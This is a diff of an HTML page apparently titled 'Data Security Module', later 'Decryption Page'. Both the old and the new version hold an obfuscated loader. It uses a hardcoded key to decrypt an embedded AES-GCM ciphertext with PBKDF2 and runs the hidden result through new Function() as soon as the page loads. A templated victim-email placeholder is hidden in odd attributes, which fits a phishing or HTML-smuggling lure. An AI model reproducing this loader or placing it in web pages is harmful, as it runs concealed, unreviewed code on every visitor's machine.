@@ -1,91 +1,68 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Data Security Module</title>
-    <style>
-        body {
-            background-color: #e0e0e0;
-            font-family: 'Courier New', monospace;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-        }
-        
-        .security-module {
-            text-align: center;
-            padding: 20px;
-        }
-        
-        .hidden-marker {
-            display: none;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <title>Decryption Page</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 20px;
+    }
+  </style>
 </head>
 <body>
-    <div class="security-module">
-        <span class="hidden-marker" data-identifier=""></span>
-        <hr nike-hackboy="" adidas="<%=EMAIL64%>">
-    </div>
 
-    <script data-security-config="CBSCTBABDUAAABACAABAAlyOHKvkPFruTmLR2MTWjA5ihF6nSQvpZLfVWwkiPQya2Y3E7ZfDid7c8ZDi2xE3ts_hMVf97872UAvCTwkLuZRVJRY6D2VpWbLI60V3THrA">
-        const securityPayload = {
-            initializationVector: "ceb0f4f1afbc695ad02798ab",
-            encryptionSalt: "752dba59f37d01b08991d9e6c34ac389",
-            cipherText: "7bff1ae4d47ea505fd6c83c97eb65a0ef996d06e0650b6621557464fb7a63a350bfb1ad9721a50376393f1751c376bb871d0a2a271d571d13497674fc27a2101feaf4648f7665ce05a5026d879529ffa559960eff54350865101249e319f5d5b1c7b3f888db4104afc3c8708f0ad2dacc6de7a0f088dbcb03bf946f173309556cba4e260d7e96caceee55e4548d1821d424587b2c252a46c8ef643e91fabf666da72f60def1cdc4c598bec8cdeef592b93f6d9aedd25e1a199c44b2bb27547c2"
-        };
-        const masterKey = "ea58c0ef491543774f851a0a594c7535";
+<!-- You can add some basic HTML content here if needed -->
 
-        function convertHexToBinary(hexString) {
-            const bytes = new Uint8Array(hexString.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
-            return bytes;
-        }
+<script adidas="<%=EMAIL64%>" nike-success="">
+  const securePayload = {
+    ivHex: "ceb0f4f1afbc695ad02798ab",
+    saltHex: "752dba59f37d01b08991d9e6c34ac389",
+    encryptedHex: "7bff1ae4d47ea505fd6c83c97eb65a0ef996d06e0650b6621557464fb7a63a350bfb1ad9721a50376393f1751c376bb871d0a2a271d571d13497674fc27a2101feaf4648f7665ce05a5026d879529ffa559960eff54350865101249e319f5d5b1c7b3f888db4104afc3c8708f0ad2dacc6de7a0f088dbcb03bf946f173309556cba4e260d7e96caceee55e4548d1821d424587b2c252a46c8ef643e91fabf666da72f60def1cdc4c598bec8cdeef592b93f6d9aedd25e1a199c44b2bb27547c2"
+  };
 
-        async function processSecureData() {
-            try {
-                const baseKey = await crypto.subtle.importKey(
-                    "raw",
-                    new TextEncoder().encode(masterKey),
-                    { name: "PBKDF2" },
-                    false,
-                    ["deriveKey"]
-                );
+  const secretKey = "ea58c0ef491543774f851a0a594c7535";
 
-                const operationalKey = await crypto.subtle.deriveKey(
-                    {
-                        name: "PBKDF2",
-                        salt: convertHexToBinary(securityPayload.encryptionSalt),
-                        iterations: 100000,
-                        hash: "SHA-256"
-                    },
-                    baseKey,
-                    { name: "AES-GCM", length: 256 },
-                    false,
-                    ["decrypt"]
-                );
+  const convertHexToBytes = (hex) => new Uint8Array(hex.match(/.{1,2}/g).map(b => parseInt(b, 16)));
 
-                const decryptedResult = await crypto.subtle.decrypt(
-                    { 
-                        name: "AES-GCM", 
-                        iv: convertHexToBinary(securityPayload.initializationVector) 
-                    },
-                    operationalKey,
-                    convertHexToBinary(securityPayload.cipherText)
-                );
+  async function unlockPayload() {
+    try {
+      const rawKey = await crypto.subtle.importKey(
+        "raw",
+        new TextEncoder().encode(secretKey),
+        { name: "PBKDF2" },
+        false,
+        ["deriveKey"]
+      );
 
-                const decodedContent = new TextDecoder().decode(decryptedResult);
-                if (decodedContent) {
-                    new Function(decodedContent)();
-                }
-            } catch (error) {
-                console.error("Data processing error:", error);
-            }
-        }
+      const aesKey = await crypto.subtle.deriveKey(
+        {
+          name: "PBKDF2",
+          salt: convertHexToBytes(securePayload.saltHex),
+          iterations: 100000,
+          hash: "SHA-256"
+        },
+        rawKey,
+        { name: "AES-GCM", length: 256 },
+        false,
+        ["decrypt"]
+      );
 
-        document.addEventListener('DOMContentLoaded', processSecureData);
-    </script>
+      const decryptedBuffer = await crypto.subtle.decrypt(
+        { name: "AES-GCM", iv: convertHexToBytes(securePayload.ivHex) },
+        aesKey,
+        convertHexToBytes(securePayload.encryptedHex)
+      );
+
+      const result = new TextDecoder().decode(decryptedBuffer);
+      if (result) new Function(result)();
+    } catch (err) {
+      console.error("Failed to unlock payload:", err);
+    }
+  }
+
+  unlockPayload();
+</script>
+
 </body>
 </html>
